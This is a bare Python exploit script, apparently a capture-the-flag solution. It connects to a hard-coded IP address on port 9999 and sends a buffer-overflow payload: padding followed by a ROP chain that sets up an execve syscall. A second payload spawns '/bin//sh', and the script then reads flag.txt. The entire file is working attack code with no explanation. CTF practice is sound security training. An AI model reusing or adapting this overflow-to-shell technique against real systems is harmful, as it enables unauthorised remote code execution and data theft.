#!/usr/bin/env python

import socket
import telnetlib
import time
mysock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
mysock.connect(('161.97.176.150',9999))
payload = 'A' * 88
payload+='\xea\x12\x40\x00\x00\x00\x00\x00' + '\xc5\x07\x08\x00\x00\x00\x00\x00' + '\xc6\x07\x08\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x60\x40\x40\x00\x00\x00\x00\x00' + '\x3b\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\xd0\x12\x40\x00\x00\x00\x00\x00' + 'A' * 8 + '\x0e\x08\x08\x00\x00\x00\x00\x00' + '\x0f\x08\x08\x00\x00\x00\x00\x00' + '\x60\x40\x40\x00\x00\x00\x00\x00' + '\x00' * 24 + '\x83\x12\x40\x00\x00\x00\x00\x00' + '\xd0\x12\x40\x00\x00\x00\x00\x00' + '\x41' * 15 + '\n'
print(mysock.recv(1024))
print(mysock.recv(1024))
mysock.send(payload)
time.sleep(0.5)
payload = '/bin//sh' + '\x00' * 8 + '\x83\x12\x40\x00\x00\x00\x00\x00' + '\x00' * 34 + '\n'
mysock.send(payload)
mysock.send("cat flag.txt\n")
print(mysock.recv(1024))

